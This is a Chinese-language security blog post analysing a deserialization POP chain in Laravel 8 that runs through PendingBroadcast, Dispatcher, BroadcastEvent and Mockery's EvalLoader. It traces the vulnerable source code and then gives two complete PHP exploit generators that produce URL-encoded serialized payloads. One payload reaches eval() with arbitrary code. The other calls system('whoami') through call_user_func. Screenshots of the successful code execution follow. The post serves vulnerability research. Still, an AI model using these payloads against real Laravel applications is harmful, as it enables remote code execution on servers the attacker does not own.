## forward

laravel的版本已经到了8；这里分析一个laravel8的反序列化漏洞，但是让我感到意外的是，这个漏洞竟然在低版本的laravel上依然可以存在，从根本来说这个漏洞是laravel的mockery组件漏洞，没想到一直没修；

本文涉及知识点实操练习：[Fastjson反序列化漏洞](https://www.hetianlab.com/expc.do?ec=ECID49a7-7e01-41dd-9edd-c051743c427f&pk_campaign=freebuf-wemedia)（Fastjson是阿里巴巴公司开源的一款json解析器，在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。）

## text

首先还是老样子，熟悉laravel的pop链的师傅肯定比较熟悉，入口点还是PendingBroadcast.php中的析构函数；

    
    
    public function __destruct()
    {
        $this->events->dispatch($this->event);
    }
    

这里很明显可以控制任意类下的dispatch函数；这里还是选择Dispatcher.php进行续链；

    
    
    public function dispatch($command)
    {
        return $this->queueResolver && $this->commandShouldBeQueued($command)
                        ? $this->dispatchToQueue($command)
                        : $this->dispatchNow($command);
    }
    

这里简单的看下源码，感兴趣的师傅可以拿着laravel5的源码来进行对比，这里只不过是写成了三元运算的形式，本质上还是一样的，我们控制queueResolver变量和commandShouldBeQueued函数，使其返回为真，这样就可进入dispatchToQueue函数；这里审计下类不难发现queueResolver是我们可控的变量，然而commandShouldBeQueued函数我们可以追溯一下；

    
    
    protected function commandShouldBeQueued($command)
    {
        return $command instanceof ShouldQueue;
    }
    

这里不难发现，是需要我们的command是继承ShouldQueue接口的类就可；所以全局搜索；选择BroadcastEvent.php的类；然后便可返回true，然后进入dispatchToQueue函数；回溯一下dispatchToQueue函数；

    
    
    public function dispatchToQueue($command)
        {
            $connection = $command->connection ?? null;
    
            $queue = call_user_func($this->queueResolver, $connection);
    

可以发现这里有个危险函数call_user_func；可以直接实现任意类下的任意方法；这里就可直接跳转到我们想要执行的方法下；全局搜索一下eval方法；发现存在；

    
    
    class EvalLoader implements Loader
    {
        public function load(MockDefinition $definition)
        {
            if (class_exists($definition->getClassName(), false)) {
                return;
            }
    
            eval("?>" . $definition->getCode());
        }
    }
    

call_user_func函数在第一个参数为数组的时候，第一个参数就是我们选择的类，第二个参数是类下的方法；所以这里直接去到EvalLoader类，去执行load方法从而调用到eval函数；这里发现存在参数，而且参数必须是MockDefinition类的实例；也即是意味着我们connection需要为MockDefinition类的实例；

继续审计发现，必须if为false才会触发eval方法；所以这里我们需要直接追溯到MockDefinition类中；

    
    
    class MockDefinition
    {
        protected $config;
        protected $code;
    
        public function __construct(MockConfiguration $config, $code)
        {
            if (!$config->getName()) {
                throw new \InvalidArgumentException("MockConfiguration must contain a name");
            }
            $this->config = $config;
            $this->code = $code;
        }
    
        public function getConfig()
        {
            return $this->config;
        }
    
        public function getClassName()
        {
            return $this->config->getName();
        }
        public function getCode()
        {
            return $this->code;
        }
    }
    

看下getClassName函数；这里的config是可控的，所以我们直接找到一个存在getName方法并且可控该方法的类；全局搜索下找到MockConfiguration.php可以实现；

    
    
    protected $name;
        public function getName()
        {
            return $this->name;
        }
    

因为最后是要经过class_exit函数的判断的，所以我们可以直接控制其返回一个不存在的类，就会造成false从而进入eval方法；继续回到eval方法；

    
    
    class EvalLoader implements Loader
    {
        public function load(MockDefinition $definition)
        {
            if (class_exists($definition->getClassName(), false)) {
                return;
            }
    
            eval("?>" . $definition->getCode());
        }
    }
    

这里还有个getCode方法，我们通过上面的类也可审计getCode方法；code在MockDefinition类中也是可控的，所以我们可以随意的控制其内容，那么我们就可命令执行；放出我exp：

    
    
    <?php
    
    namespace Illuminate\Broadcasting{
    
    use Illuminate\Contracts\Events\Dispatcher;
    
    class PendingBroadcast
    {
    	protected $event;
    	protected $events;
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
    }
    namespace Illuminate\Bus{
    class Dispatcher
    {
    	protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    
    }
    }
    namespace Illuminate\Broadcasting{
    class BroadcastEvent
    {
    	public $connection;
    	public function __construct($connection)
        {
            $this->connection = $connection;
        }
    		}
    }
    
    namespace Mockery\Loader{
    
    use Mockery\Generator\MockDefinition;
    class EvalLoader
    {
    	    public function load(MockDefinition $definition)
        {}
    }
    }
    namespace Mockery\Generator{
    class MockConfiguration
    {	
    protected $name;
    	public function __construct($name){
    
    	$this->name = $name;
    }
    }
    
    
    }
    namespace Mockery\Generator{
    
    class MockDefinition
    {
    	protected $config;
    	protected $code;
    	public function __construct($config,$code)
        {
        	$this->config = $config;
        	$this->code = $code;
        }
    }
    }
    namespace{
    	$e = new Mockery\Generator\MockConfiguration('s1mple');
    	$d = new Mockery\Loader\EvalLoader();
    	$f = new Mockery\Generator\MockDefinition($e,'<?php phpinfo();?>');
    	$c = new Illuminate\Broadcasting\BroadcastEvent($f);
    	$a = new Illuminate\Bus\Dispatcher(array($d,"load"));
    	$b = new Illuminate\Broadcasting\PendingBroadcast($a,$c);
    	echo urlencode(serialize($b));
    }
    

这里为了节省时间，我最后用abcdef直接代替了，造成rce；

![6lOUIJ.png](https://image.3001.net/images/20210316/1615882019_605067237ec176d7358cf.png!small)

细心的师傅想必也发现了；在最开始的call_user_func处，也是可以进行命令执行的；

    
    
    public function dispatchToQueue($command)
        {
            $connection = $command->connection ?? null;
    
            $queue = call_user_func($this->queueResolver, $connection);
    

这里可以直接控制进行命令执行；这个很简单，就直接放出我exp吧；

    
    
    <?php
    
    namespace Illuminate\Broadcasting{
    
    use Illuminate\Contracts\Events\Dispatcher;
    
    class PendingBroadcast
    {
    	protected $event;
    	protected $events;
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
    }
    namespace Illuminate\Bus{
    class Dispatcher
    {
    	protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    
    }
    }
    namespace Illuminate\Broadcasting{
    class BroadcastEvent
    {
    	public $connection;
    	public function __construct($connection)
        {
            $this->connection = $connection;
        }
    		}
    }
    namespace{
    	$c = new Illuminate\Broadcasting\BroadcastEvent('whoami');
    	$a = new Illuminate\Bus\Dispatcher('system');
    	$b = new Illuminate\Broadcasting\PendingBroadcast($a,$c);
    	echo urlencode(serialize($b));
    }
    

![6lXSyV.png](https://image.3001.net/images/20210316/1615882026_6050672a3c41a87311d5b.png!small)

